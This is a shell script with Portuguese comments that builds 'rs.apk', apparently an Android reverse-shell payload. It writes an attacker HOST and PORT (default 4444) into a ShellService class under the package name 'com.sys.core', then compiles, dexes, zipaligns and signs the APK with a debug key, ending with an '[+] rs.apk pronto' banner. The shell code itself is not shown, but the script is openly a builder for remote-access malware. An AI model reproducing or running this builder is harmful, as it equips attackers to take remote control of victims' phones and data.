#!/bin/sh
# gera rs.apk. requer JDK + Android build-tools + platform android-33
set -e
SDK="${ANDROID_HOME:-${ANDROID_SDK_ROOT:-$HOME/Android/Sdk}}"
BT=$(ls -d "$SDK"/build-tools/* 2>/dev/null | sort -V | tail -1)
PLAT=$(ls -d "$SDK"/platforms/android-3* 2>/dev/null | sort -V | tail -1)
[ -n "$BT" ] && [ -n "$PLAT" ] || { echo "faltam build-tools/platform em $SDK"; exit 1; }
JAR="$PLAT/android.jar"
HOST="${HOST:-0.0.0.0}"; PORT="${PORT:-4444}"

sed -i "s|static final String HOST = .*|static final String HOST = \"$HOST\";|" src/com/sys/core/ShellService.java
sed -i "s|static final int PORT = .*|static final int PORT = $PORT;|"           src/com/sys/core/ShellService.java

rm -rf build; mkdir -p build/gen build/classes build/dex

"$BT/aapt2" compile --dir res -o build/res.zip
"$BT/aapt2" link -o build/base.apk -I "$JAR" \
    --manifest AndroidManifest.xml --java build/gen build/res.zip \
    --min-sdk-version 21 --target-sdk-version 33

javac -nowarn -source 8 -target 8 -bootclasspath "$JAR" -d build/classes \
    $(find src build/gen -name '*.java')
"$BT/d8" --lib "$JAR" --min-api 21 --output build/dex $(find build/classes -name '*.class')
(cd build/dex && zip -q -u ../base.apk classes.dex)

"$BT/zipalign" -f -p 4 build/base.apk build/aligned.apk

KS="$HOME/.android/debug.keystore"
[ -f "$KS" ] || keytool -genkeypair -keystore "$KS" -storepass android -keypass android \
    -alias androiddebugkey -keyalg RSA -keysize 2048 -validity 10000 -dname "CN=Android Debug,O=Android,C=US" >/dev/null 2>&1

"$BT/apksigner" sign --ks "$KS" --ks-pass pass:android --key-pass pass:android \
    --v1-signing-enabled true --v2-signing-enabled true --out rs.apk build/aligned.apk
echo "[+] rs.apk pronto -> $HOST:$PORT"